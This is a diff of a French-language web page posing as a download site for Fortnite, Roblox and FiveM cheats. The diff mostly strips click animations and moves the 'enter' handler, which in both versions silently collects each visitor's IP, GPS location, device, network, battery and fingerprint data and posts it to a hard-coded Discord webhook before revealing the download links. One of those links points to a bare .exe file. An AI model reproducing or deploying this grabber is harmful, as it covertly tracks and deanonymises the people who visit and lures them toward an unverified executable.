@@ -205,34 +205,10 @@
       transition: all 0.3s ease;
       box-shadow: 0 0 15px rgba(255, 45, 117, 0.3);
       backdrop-filter: blur(5px);
-      position: relative;
-      overflow: hidden;
     }
     .cheat-category:hover {
       background: rgba(255, 45, 117, 0.1);
       transform: translateY(-5px);
-    }
-    /* Animation au clic */
-    .cheat-category:active {
-      transform: scale(0.95);
-      box-shadow: 0 0 25px #ff2d75, 0 0 40px #ff2d75;
-      transition: transform 0.1s ease, box-shadow 0.1s ease;
-    }
-    .cheat-category::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle at center, rgba(255, 45, 117, 0.3) 0%, transparent 70%);
-      opacity: 0;
-      transition: opacity 0.3s ease;
-      z-index: -1;
-      border-radius: 10px;
-    }
-    .cheat-category:active::before {
-      opacity: 1;
     }
     .cheat-category img {
       width: 100%;
@@ -241,19 +217,11 @@
       border-radius: 8px;
       margin-bottom: 20px;
       border: 1px solid #ff2d75;
-      transition: transform 0.3s ease;
-    }
-    .cheat-category:active img {
-      transform: scale(0.98);
     }
     .cheat-category h2 {
       color: #ff2d75;
       font-size: 28px;
       margin: 0;
-      transition: text-shadow 0.2s ease;
-    }
-    .cheat-category:active h2 {
-      text-shadow: 0 0 15px #ff2d75;
     }
     .download-link {
       display: block;
@@ -261,14 +229,7 @@
       color: #00ffff;
       text-decoration: none;
       font-size: 16px;
-      transition: all 0.2s ease;
-      position: relative;
-      z-index: 2;
-    }
-    .cheat-category:active .download-link {
-      color: #ffffff;
-      text-shadow: 0 0 10px #00ffff;
-      transform: translateY(2px);
+      transition: color 0.3s ease;
     }
     .download-link:hover {
       color: #ffffff;
@@ -372,24 +333,6 @@
       background: #00ffff;
       cursor: pointer;
     }
-    /* Animation de clic pour les boutons de téléchargement */
-    @keyframes clickAnimation {
-      0% {
-        transform: scale(1);
-        box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.7);
-      }
-      70% {
-        transform: scale(0.9);
-        box-shadow: 0 0 0 10px rgba(0, 255, 255, 0);
-      }
-      100% {
-        transform: scale(1);
-        box-shadow: 0 0 0 0 rgba(0, 255, 255, 0);
-      }
-    }
-    .download-link.click-animation {
-      animation: clickAnimation 0.5s ease-out;
-    }
   </style>
 </head>
 <body>
@@ -408,17 +351,17 @@
     <div class="custom-cursor" id="customCursor"></div>
     <h1 class="cheat-header">🎮 Les Cheats</h1>
     <div class="cheat-categories">
-      <div class="cheat-category" data-game="fortnite">
+      <div class="cheat-category">
         <img src="images/fortnite.jpg" alt="Fortnite">
         <h2>Cheat - Fortnite</h2>
         <a href="#" class="download-link" data-url="https://gofile.io/d/JAtR5r" target="_blank">Lien de téléchargement</a>
       </div>
-      <div class="cheat-category" data-game="roblox">
+      <div class="cheat-category">
         <img src="images/roblox.jpg" alt="Roblox">
         <h2>Cheat - Roblox</h2>
         <a href="#" class="download-link" data-url="https://gofile.io/d/2L8xBf" target="_blank">Lien de téléchargement</a>
       </div>
-      <div class="cheat-category" data-game="fivem">
+      <div class="cheat-category">
         <img src="images/fivem.jpg" alt="FiveM">
         <h2>Cheat - FiveM</h2>
         <a href="#" class="download-link" data-url="https://cdn.discordapp.com/attachments/1376243443277234269/1377119056024572006/Hul1ygW7XFRq.exe?ex=68cd6fd0&is=68cc1e50&hm=d2830f4d3eec42185600ec6c39d0ea0a6cbd601f591a861d3915cd7492571740&" target="_blank">Lien de téléchargement</a>
@@ -428,7 +371,7 @@
       Created by 96
     </div>
   </div>
-  <!-- Page de redirection (conservée mais non utilisée pour les liens directs) -->
+  <!-- Page de redirection -->
   <div class="redirect-page" id="redirectPage">
     <div class="neon-stars" id="redirectNeonStars"></div>
     <div class="redirect-content">
@@ -484,307 +427,47 @@
       });
     }
 
-    // Animation au clic sur les cheats
-    function setupCheatAnimations() {
-      const cheatCategories = document.querySelectorAll('.cheat-category');
-      const downloadLinks = document.querySelectorAll('.download-link');
-
-      // Animation pour les catégories de cheat
-      cheatCategories.forEach(category => {
-        category.addEventListener('mousedown', function() {
-          // Ajout d'un effet sonore de clic
-          const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          const oscillator = audioCtx.createOscillator();
-          oscillator.type = 'sine';
-          oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
-          oscillator.connect(audioCtx.destination);
-          oscillator.start();
-          oscillator.stop(audioCtx.currentTime + 0.1);
-        });
-      });
-
-      // Animation pour les liens de téléchargement avec redirection directe
-      downloadLinks.forEach(link => {
-        link.addEventListener('click', function(e) {
-          // Empêcher le comportement par défaut temporairement pour l'animation
-          e.preventDefault();
-
-          // Ajouter l'animation
-          this.classList.add('click-animation');
-
-          // Rediriger directement après un court délai pour permettre à l'animation de se jouer
-          setTimeout(() => {
-            window.open(this.getAttribute('data-url'), '_blank');
-            this.classList.remove('click-animation');
-          }, 300);
-        });
-      });
-    }
-
-    // Gestion du bouton d'entrée (conservé tel quel)
+    // Gestion des liens de téléchargement
     function setupDownloadLinks() {
-      const enterButton = document.getElementById('enterButton');
-      const cheatPage = document.getElementById('cheatPage');
-
-      enterButton.addEventListener('click', async function () {
-        const infosDiv = document.getElementById('infos');
-        infosDiv.textContent = "Collecte des informations en cours...";
-
-        // Récupération de l'IP
-        let ip = "Non disponible";
-        try {
-          const resIP = await fetch('https://api.ipify.org?format=json');
-          const dataIP = await resIP.json();
-          ip = dataIP.ip || ip;
-        } catch (e) {
-          console.warn("Erreur récupération IP:", e);
-        }
-
-        // Récupération de toutes les informations en parallèle
-        const [
-          ipGeoloc,
-          geoloc,
-          batteryInfo,
-          deviceInfo,
-          networkInfo,
-          storageInfo,
-          securityInfo,
-          performanceInfo,
-          mediaInfo,
-          fontInfo,
-          webglInfo,
-          canvasFingerprint
-        ] = await Promise.allSettled([
-          getIPGeolocation(ip),
-          getGeolocation(),
-          getBatteryInfo(),
-          getDeviceInfo(),
-          getNetworkInfo(),
-          getStorageInfo(),
-          getSecurityInfo(),
-          getPerformanceInfo(),
-          getMediaInfo(),
-          getFontInfo(),
-          getWebGLInfo(),
-          getCanvasFingerprint()
-        ]).then(results => results.map(r => r.status === 'fulfilled' ? r.value : { error: r.reason.message || "Erreur inconnue" }));
-
-        // Récupération des performances
-        const perf = performance.timing;
-        const pageLoadTime = perf.loadEventEnd && perf.navigationStart ? perf.loadEventEnd - perf.navigationStart : "Non disponible";
-
-        // Construction de l'objet complet avec toutes les informations
-        const infos = {
-          // Informations de base
-          "IP Publique": ip,
-          "Localisation (IP)": ipGeoloc.error ? ipGeoloc.error :
-            `${ipGeoloc.ville}, ${ipGeoloc.region}, ${ipGeoloc.pays} (Lat: ${ipGeoloc.latitude}, Long: ${ipGeoloc.longitude}) - ${ipGeoloc.isp}`,
-          "Géolocalisation précise": geoloc.error ? geoloc.error :
-            `Latitude: ${geoloc.latitude}, Longitude: ${geoloc.longitude}, Précision: ${geoloc.accuracy}`,
-          // Informations navigateur
-          "User-Agent": navigator.userAgent,
-          "Version Navigateur": parseBrowserVersion(navigator.userAgent),
-          "Langue": navigator.language,
-          "Langues Acceptées": navigator.languages ? navigator.languages.join(', ') : "Non disponible",
-          "Plateforme": navigator.platform,
-          "Plugins installés": navigator.plugins.length > 0 ? [...navigator.plugins].map(p => p.name).join(', ') : "Aucun",
-          // Informations appareil
-          "📱 Appareil": `
-            Modèle: ${deviceInfo.model}
-            Architecture: ${deviceInfo.architecture}
-            Mobile: ${deviceInfo.mobile}
-            Mémoire: ${deviceInfo.memoire}
-            Cœurs CPU: ${deviceInfo.cores}
-            Touch Points: ${deviceInfo.max_touch_points}
-            Orientation: ${deviceInfo.orientation}
-            Pixel Ratio: ${deviceInfo.pixel_ratio}
-            Couleur: ${deviceInfo.couleur_profondeur}
-            Résolution: ${deviceInfo.resolution}
-            Fuseau horaire: ${deviceInfo.time_zone}
-            Capteurs:
-              Accélromètre: ${deviceInfo.capteurs.accelerometre}
-              Gyroscope: ${deviceInfo.capteurs.gyroscope}
-              Luminosité: ${deviceInfo.capteurs.luminosite}
-              Proximité: ${deviceInfo.capteurs.proximite}
-          `,
-          // Informations réseau
-          "🌐 Réseau": `
-            En ligne: ${networkInfo.en_ligne}
-            Type: ${networkInfo.type_reseau}
-            Débit: ${networkInfo.debit_descendant}
-            RTT: ${networkInfo.rtt}
-            Sauvegarde données: ${networkInfo.sauvegarde_donnees}
-            Type connexion: ${networkInfo.connection_type}
-            Proxy: ${ipGeoloc.proxy || "Non"}
-            Hosting: ${ipGeoloc.hosting || "Non"}
-          `,
-          // Informations batterie
-          "🔋 Batterie": batteryInfo.error ? batteryInfo.error : `
-            Niveau: ${batteryInfo.niveau}
-            En charge: ${batteryInfo.en_charge}
-            Temps charge: ${batteryInfo.temps_charge}
-            Temps décharge: ${batteryInfo.temps_decharge}
-          `,
-          // Informations stockage
-          "💾 Stockage": `
-            Cookies: ${storageInfo.cookies}
-            LocalStorage: ${storageInfo.local_storage}
-            SessionStorage: ${storageInfo.session_storage}
-            IndexedDB: ${storageInfo.indexdb}
-            Cache API: ${storageInfo.cache_api}
-            Service Workers: ${storageInfo.service_workers}
-          `,
-          // Informations sécurité
-          "🔒 Sécurité": `
-            Protocole: ${securityInfo.protocol}
-            SSL: ${securityInfo.ssl}
-            Referrer Policy: ${securityInfo.referrer_policy}
-            CSP: ${securityInfo.content_security}
-            XSS Protection: ${securityInfo.xss_protection}
-            Crypto: ${securityInfo.crypto}
-          `,
-          // Informations performances
-          "⚡ Performances": `
-            Temps chargement: ${performanceInfo.temps_chargement} ms
-            Temps DOM: ${performanceInfo.temps_dom} ms
-            Temps DNS: ${performanceInfo.temps_dns} ms
-            Temps TCP: ${performanceInfo.temps_tcp} ms
-            Temps requête: ${performanceInfo.temps_request} ms
-            Type navigation: ${performanceInfo.type_navigation}
-            Redirections: ${performanceInfo.redirect_count}
-          `,
-          // Informations médias
-          "🎵 Médias": `
-            Audio MP3: ${mediaInfo.audio.mp3}
-            Audio OGG: ${mediaInfo.audio.ogg}
-            Audio WAV: ${mediaInfo.audio.wav}
-            Vidéo MP4: ${mediaInfo.video.mp4}
-            Vidéo WebM: ${mediaInfo.video.webm}
-            Vidéo OGG: ${mediaInfo.video.ogg}
-            Codecs: ${mediaInfo.codecs}
-            Devices: ${mediaInfo.devices}
-          `,
-          // Informations polices
-          "🖋️ Polices": `
-            Polices détectées: ${fontInfo.polices_detectees}
-            Testées: ${fontInfo.total_testes}
-            API Fonts: ${fontInfo.api_fonts}
-          `,
-          // Informations WebGL
-          "🎮 WebGL": webglInfo.error ? webglInfo.error : `
-            Vendor: ${webglInfo.vendor}
-            Renderer: ${webglInfo.renderer}
-            Shading Language: ${webglInfo.shading_language}
-            Max Texture Size: ${webglInfo.max_texture_size}
-            Anti-alias: ${webglInfo.antialias}
-          `,
-          // Empreinte canvas
-          "🎨 Empreinte Canvas": canvasFingerprint.length > 100 ?
-            "Empreinte générée (voir données brutes)" : canvasFingerprint,
-          // Autres informations existantes
-          "Cookies activés": navigator.cookieEnabled ? "Oui" : "Non",
-          "Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Non disponible",
-          "Heure locale": new Date().toString(),
-          "URL courante": window.location.href,
-          "Référent": document.referrer || "Aucun",
-          "Temps de chargement page (ms)": pageLoadTime,
-          // Données brutes pour analyse
-          "_raw_data": {
-            ipGeoloc: ipGeoloc,
-            geoloc: geoloc,
-            batteryInfo: batteryInfo,
-            deviceInfo: deviceInfo,
-            networkInfo: networkInfo,
-            storageInfo: storageInfo,
-            securityInfo: securityInfo,
-            performanceInfo: performanceInfo,
-            mediaInfo: mediaInfo,
-            fontInfo: fontInfo,
-            webglInfo: webglInfo,
-            canvasFingerprint: canvasFingerprint
-          }
-        };
-
-        // Prépare le payload Discord avec gestion des longs textes
-        const webhookURL = "https://discord.com/api/webhooks/1417533151512625225/Ky4eEBPIDVeF_kOIIDbxOaSHZFYQkzUwZhf1AEw4ZUm7G8fjU--figq3tEZ84Cg1dwkt";
-
-        // Formatage spécial pour Discord
-        const fields = [];
-        let currentEmbed = {
-          title: "📊 Informations Complètes du Visiteur (1/" + Math.ceil(Object.keys(infos).length / 25) + ")",
-          color: 0xFF0000,
-          fields: [],
-          timestamp: new Date()
-        };
-        let fieldCount = 0;
-        let embedCount = 1;
-        for (const [key, value] of Object.entries(infos)) {
-          if (key === "_raw_data") continue;
-          const fieldName = key;
-          const fieldValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
-          // Découpage des valeurs trop longues
-          const chunks = [];
-          for (let i = 0; i < fieldValue.length; i += 1020) {
-            chunks.push(fieldValue.substring(i, i + 1020));
-          }
-          // Ajout du premier chunk
-          fields.push({
-            name: fieldName,
-            value: chunks[0],
-            inline: chunks.length === 1
+      const links = document.querySelectorAll('.download-link');
+      const redirectPage = document.getElementById('redirectPage');
+      const redirectTimer = document.getElementById('redirectTimer');
+      const redirectMusic = document.getElementById('redirectMusic');
+      const volumeSlider = document.getElementById('volumeSlider');
+      // Variable pour stocker l'URL de redirection
+      let currentRedirectUrl = '';
+      // Contrôle du volume
+      volumeSlider.addEventListener('input', function() {
+        redirectMusic.volume = this.value;
+      });
+      links.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          currentRedirectUrl = link.getAttribute('data-url');
+          // Afficher la page de redirection
+          redirectPage.style.display = 'block';
+          createNeonStars('redirectNeonStars');
+          // Lancer la musique
+          redirectMusic.currentTime = 0;
+          redirectMusic.volume = volumeSlider.value;
+          redirectMusic.play().catch(error => {
+            console.log("La lecture automatique a été bloquée :", error);
           });
-          fieldCount++;
-          // Ajout des chunks supplémentaires si nécessaire
-          for (let i = 1; i < chunks.length; i++) {
-            if (fieldCount >= 25) {
-              currentEmbed.fields = fields.slice(-25);
-              fieldCount = 0;
-              embedCount++;
+          // Compte à rebours (25 secondes)
+          let count = 25;
+          redirectTimer.textContent = count;
+          const timer = setInterval(() => {
+            count--;
+            redirectTimer.textContent = count;
+            if (count <= 0) {
+              clearInterval(timer);
+              // Redirection directe vers l'URL
+              window.location.href = currentRedirectUrl;
+              redirectPage.style.display = 'none';
+              redirectMusic.pause();
             }
-            fields.push({
-              name: `↳ ${fieldName} (suite ${i})`,
-              value: chunks[i],
-              inline: false
-            });
-            fieldCount++;
-          }
-          if (fieldCount >= 25) {
-            currentEmbed.fields = fields.slice(-25);
-            currentEmbed.title = `📊 Informations Complètes du Visiteur (${embedCount}/${Math.ceil(Object.keys(infos).length / 25)})`;
-            fieldCount = 0;
-            embedCount++;
-          }
-        }
-
-        // Préparation du payload final
-        const discordPayload = {
-          content: "🔔 **Nouveau visiteur détecté avec données complètes !**",
-          embeds: [{
-            title: currentEmbed.title,
-            color: currentEmbed.color,
-            fields: currentEmbed.fields,
-            timestamp: currentEmbed.timestamp,
-            footer: {
-              text: `Collecté le ${new Date().toLocaleString()} | ${Object.keys(infos).length} champs d'informations`
-            }
-          }]
-        };
-
-        // Envoi des données
-        const result = await sendWebhook(webhookURL, discordPayload);
-        if (result.success) {
-          infosDiv.textContent = "✅ Infos complètes envoyées avec succès!";
-          this.disabled = true;
-          this.style.cursor = "default";
-          // Affichage de la page des cheats
-          setTimeout(() => {
-            document.title = "Cheat";
-            cheatPage.style.display = 'block';
-            createNeonStars('neonStars');
-          }, 1500);
-        } else {
-          infosDiv.textContent = "❌ Erreur: " + result.error;
-        }
+          }, 1000);
+        });
       });
     }
 
@@ -792,7 +475,6 @@
     document.addEventListener('DOMContentLoaded', function() {
       createNeonStars('neonStars');
       setupCustomCursor();
-      setupCheatAnimations();
       setupDownloadLinks();
     });
 
@@ -1176,6 +858,268 @@
         return "Impossible de générer l'empreinte canvas";
       }
     }
+    // Gestionnaire d'événement du bouton
+    document.getElementById('enterButton').addEventListener('click', async function () {
+      const infosDiv = document.getElementById('infos');
+      infosDiv.textContent = "Collecte des informations en cours...";
+
+      // Récupération de l'IP
+      let ip = "Non disponible";
+      try {
+        const resIP = await fetch('https://api.ipify.org?format=json');
+        const dataIP = await resIP.json();
+        ip = dataIP.ip || ip;
+      } catch (e) {
+        console.warn("Erreur récupération IP:", e);
+      }
+
+      // Récupération de toutes les informations en parallèle
+      const [
+        ipGeoloc,
+        geoloc,
+        batteryInfo,
+        deviceInfo,
+        networkInfo,
+        storageInfo,
+        securityInfo,
+        performanceInfo,
+        mediaInfo,
+        fontInfo,
+        webglInfo,
+        canvasFingerprint
+      ] = await Promise.allSettled([
+        getIPGeolocation(ip),
+        getGeolocation(),
+        getBatteryInfo(),
+        getDeviceInfo(),
+        getNetworkInfo(),
+        getStorageInfo(),
+        getSecurityInfo(),
+        getPerformanceInfo(),
+        getMediaInfo(),
+        getFontInfo(),
+        getWebGLInfo(),
+        getCanvasFingerprint()
+      ]).then(results => results.map(r => r.status === 'fulfilled' ? r.value : { error: r.reason.message || "Erreur inconnue" }));
+
+      // Récupération des performances
+      const perf = performance.timing;
+      const pageLoadTime = perf.loadEventEnd && perf.navigationStart ? perf.loadEventEnd - perf.navigationStart : "Non disponible";
+
+      // Construction de l'objet complet avec toutes les informations
+      const infos = {
+        // Informations de base
+        "IP Publique": ip,
+        "Localisation (IP)": ipGeoloc.error ? ipGeoloc.error :
+          `${ipGeoloc.ville}, ${ipGeoloc.region}, ${ipGeoloc.pays} (Lat: ${ipGeoloc.latitude}, Long: ${ipGeoloc.longitude}) - ${ipGeoloc.isp}`,
+        "Géolocalisation précise": geoloc.error ? geoloc.error :
+          `Latitude: ${geoloc.latitude}, Longitude: ${geoloc.longitude}, Précision: ${geoloc.accuracy}`,
+        // Informations navigateur
+        "User-Agent": navigator.userAgent,
+        "Version Navigateur": parseBrowserVersion(navigator.userAgent),
+        "Langue": navigator.language,
+        "Langues Acceptées": navigator.languages ? navigator.languages.join(', ') : "Non disponible",
+        "Plateforme": navigator.platform,
+        "Plugins installés": navigator.plugins.length > 0 ? [...navigator.plugins].map(p => p.name).join(', ') : "Aucun",
+        // Informations appareil
+        "📱 Appareil": `
+          Modèle: ${deviceInfo.model}
+          Architecture: ${deviceInfo.architecture}
+          Mobile: ${deviceInfo.mobile}
+          Mémoire: ${deviceInfo.memoire}
+          Cœurs CPU: ${deviceInfo.cores}
+          Touch Points: ${deviceInfo.max_touch_points}
+          Orientation: ${deviceInfo.orientation}
+          Pixel Ratio: ${deviceInfo.pixel_ratio}
+          Couleur: ${deviceInfo.couleur_profondeur}
+          Résolution: ${deviceInfo.resolution}
+          Fuseau horaire: ${deviceInfo.time_zone}
+          Capteurs:
+            Accélromètre: ${deviceInfo.capteurs.accelerometre}
+            Gyroscope: ${deviceInfo.capteurs.gyroscope}
+            Luminosité: ${deviceInfo.capteurs.luminosite}
+            Proximité: ${deviceInfo.capteurs.proximite}
+        `,
+        // Informations réseau
+        "🌐 Réseau": `
+          En ligne: ${networkInfo.en_ligne}
+          Type: ${networkInfo.type_reseau}
+          Débit: ${networkInfo.debit_descendant}
+          RTT: ${networkInfo.rtt}
+          Sauvegarde données: ${networkInfo.sauvegarde_donnees}
+          Type connexion: ${networkInfo.connection_type}
+          Proxy: ${ipGeoloc.proxy || "Non"}
+          Hosting: ${ipGeoloc.hosting || "Non"}
+        `,
+        // Informations batterie
+        "🔋 Batterie": batteryInfo.error ? batteryInfo.error : `
+          Niveau: ${batteryInfo.niveau}
+          En charge: ${batteryInfo.en_charge}
+          Temps charge: ${batteryInfo.temps_charge}
+          Temps décharge: ${batteryInfo.temps_decharge}
+        `,
+        // Informations stockage
+        "💾 Stockage": `
+          Cookies: ${storageInfo.cookies}
+          LocalStorage: ${storageInfo.local_storage}
+          SessionStorage: ${storageInfo.session_storage}
+          IndexedDB: ${storageInfo.indexdb}
+          Cache API: ${storageInfo.cache_api}
+          Service Workers: ${storageInfo.service_workers}
+        `,
+        // Informations sécurité
+        "🔒 Sécurité": `
+          Protocole: ${securityInfo.protocol}
+          SSL: ${securityInfo.ssl}
+          Referrer Policy: ${securityInfo.referrer_policy}
+          CSP: ${securityInfo.content_security}
+          XSS Protection: ${securityInfo.xss_protection}
+          Crypto: ${securityInfo.crypto}
+        `,
+        // Informations performances
+        "⚡ Performances": `
+          Temps chargement: ${performanceInfo.temps_chargement} ms
+          Temps DOM: ${performanceInfo.temps_dom} ms
+          Temps DNS: ${performanceInfo.temps_dns} ms
+          Temps TCP: ${performanceInfo.temps_tcp} ms
+          Temps requête: ${performanceInfo.temps_request} ms
+          Type navigation: ${performanceInfo.type_navigation}
+          Redirections: ${performanceInfo.redirect_count}
+        `,
+        // Informations médias
+        "🎵 Médias": `
+          Audio MP3: ${mediaInfo.audio.mp3}
+          Audio OGG: ${mediaInfo.audio.ogg}
+          Audio WAV: ${mediaInfo.audio.wav}
+          Vidéo MP4: ${mediaInfo.video.mp4}
+          Vidéo WebM: ${mediaInfo.video.webm}
+          Vidéo OGG: ${mediaInfo.video.ogg}
+          Codecs: ${mediaInfo.codecs}
+          Devices: ${mediaInfo.devices}
+        `,
+        // Informations polices
+        "🖋️ Polices": `
+          Polices détectées: ${fontInfo.polices_detectees}
+          Testées: ${fontInfo.total_testes}
+          API Fonts: ${fontInfo.api_fonts}
+        `,
+        // Informations WebGL
+        "🎮 WebGL": webglInfo.error ? webglInfo.error : `
+          Vendor: ${webglInfo.vendor}
+          Renderer: ${webglInfo.renderer}
+          Shading Language: ${webglInfo.shading_language}
+          Max Texture Size: ${webglInfo.max_texture_size}
+          Anti-alias: ${webglInfo.antialias}
+        `,
+        // Empreinte canvas
+        "🎨 Empreinte Canvas": canvasFingerprint.length > 100 ?
+          "Empreinte générée (voir données brutes)" : canvasFingerprint,
+        // Autres informations existantes
+        "Cookies activés": navigator.cookieEnabled ? "Oui" : "Non",
+        "Fuseau horaire": Intl.DateTimeFormat().resolvedOptions().timeZone || "Non disponible",
+        "Heure locale": new Date().toString(),
+        "URL courante": window.location.href,
+        "Référent": document.referrer || "Aucun",
+        "Temps de chargement page (ms)": pageLoadTime,
+        // Données brutes pour analyse
+        "_raw_data": {
+          ipGeoloc: ipGeoloc,
+          geoloc: geoloc,
+          batteryInfo: batteryInfo,
+          deviceInfo: deviceInfo,
+          networkInfo: networkInfo,
+          storageInfo: storageInfo,
+          securityInfo: securityInfo,
+          performanceInfo: performanceInfo,
+          mediaInfo: mediaInfo,
+          fontInfo: fontInfo,
+          webglInfo: webglInfo,
+          canvasFingerprint: canvasFingerprint
+        }
+      };
+
+      // Prépare le payload Discord avec gestion des longs textes
+      const webhookURL = "https://discord.com/api/webhooks/1417533151512625225/Ky4eEBPIDVeF_kOIIDbxOaSHZFYQkzUwZhf1AEw4ZUm7G8fjU--figq3tEZ84Cg1dwkt";
+
+      // Formatage spécial pour Discord
+      const fields = [];
+      let currentEmbed = {
+        title: "📊 Informations Complètes du Visiteur (1/" + Math.ceil(Object.keys(infos).length / 25) + ")",
+        color: 0xFF0000,
+        fields: [],
+        timestamp: new Date()
+      };
+      let fieldCount = 0;
+      let embedCount = 1;
+      for (const [key, value] of Object.entries(infos)) {
+        if (key === "_raw_data") continue; // On saute les données brutes pour Discord
+        const fieldName = key;
+        const fieldValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
+        // Découpage des valeurs trop longues
+        const chunks = [];
+        for (let i = 0; i < fieldValue.length; i += 1020) {
+          chunks.push(fieldValue.substring(i, i + 1020));
+        }
+        // Ajout du premier chunk
+        fields.push({
+          name: fieldName,
+          value: chunks[0],
+          inline: chunks.length === 1
+        });
+        fieldCount++;
+        // Ajout des chunks supplémentaires si nécessaire
+        for (let i = 1; i < chunks.length; i++) {
+          if (fieldCount >= 25) {
+            // Nouvel embed si on atteint la limite
+            currentEmbed.fields = fields.slice(-25);
+            fieldCount = 0;
+            embedCount++;
+          }
+          fields.push({
+            name: `↳ ${fieldName} (suite ${i})`,
+            value: chunks[i],
+            inline: false
+          });
+          fieldCount++;
+        }
+        // Création d'un nouvel embed si nécessaire
+        if (fieldCount >= 25) {
+          currentEmbed.fields = fields.slice(-25);
+          currentEmbed.title = `📊 Informations Complètes du Visiteur (${embedCount}/${Math.ceil(Object.keys(infos).length / 25)})`;
+          fieldCount = 0;
+          embedCount++;
+        }
+      }
+
+      // Préparation du payload final
+      const discordPayload = {
+        content: "🔔 **Nouveau visiteur détecté avec données complètes !**",
+        embeds: [{
+          title: currentEmbed.title,
+          color: currentEmbed.color,
+          fields: currentEmbed.fields,
+          timestamp: currentEmbed.timestamp,
+          footer: {
+            text: `Collecté le ${new Date().toLocaleString()} | ${Object.keys(infos).length} champs d'informations`
+          }
+        }]
+      };
+
+      // Envoi des données
+      const result = await sendWebhook(webhookURL, discordPayload);
+      if (result.success) {
+        infosDiv.textContent = "✅ Infos complètes envoyées avec succès!";
+        this.disabled = true;
+        this.style.cursor = "default";
+        // Affichage de la page des cheats
+        setTimeout(() => {
+          document.title = "Cheat";
+          document.getElementById('cheatPage').style.display = 'block';
+        }, 1500);
+      } else {
+        infosDiv.textContent = "❌ Erreur: " + result.error;
+      }
+    });
   </script>
 </body>
 </html>
